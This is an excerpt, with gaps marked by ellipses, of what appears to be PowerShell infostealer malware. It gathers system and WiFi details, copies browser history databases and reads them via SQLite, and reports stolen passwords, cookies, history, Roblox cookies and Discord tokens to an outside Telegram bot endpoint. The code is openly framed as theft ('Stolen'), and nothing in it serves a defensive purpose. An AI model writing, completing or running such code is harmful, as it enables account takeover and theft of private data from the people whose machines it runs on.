...
function ts($m) {
  ...
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $b -ContentType "application/json" -TimeoutSec 15 | Out-Null; break }
    catch { if ($i -eq 2) { break }; Start-Sleep -Seconds 3 }
  }
...
$os = try { (Get-WmiObject Win32_OperatingSystem).Caption } catch { "Unknown" }
...
if ($wifiList.Count -gt 0) { ts "[+] WiFi: $($wifiList -join '; ')" }
...
foreach ($browser in $browsers) {
  ...
  if (Test-Path $basePath) {
    Get-ChildItem "$basePath\Profile *" -Directory -ErrorAction SilentlyContinue | ForEach-Object { $profiles += $_.Name }
  } else { continue }
  ...
  foreach ($profile in $profiles) {
    ...
    if (Test-Path $historyDb) {
      ...
      Copy-Item $historyDb $tmpDb -Force
      $dbPtr = [IntPtr]::Zero
      if ([N]::sqlite3_open($tmpDb, [ref]$dbPtr) -eq 0) {
        $stmt = [IntPtr]::Zero
...
ts "[+] Stolen: $pwCount passwords, $ckCount cookies, $histCount history entries"
if ($robCookie) { ts "[+] Roblox Cookie: $robCookie" } else { ts "[-] No Roblox cookie found" }
...
if ($tokens.Count -gt 0) { ts "[+] Discord Tokens ($($tokens.Count)): $($tokens -join '`n')" } else { ts "[-] No Discord tokens found" }
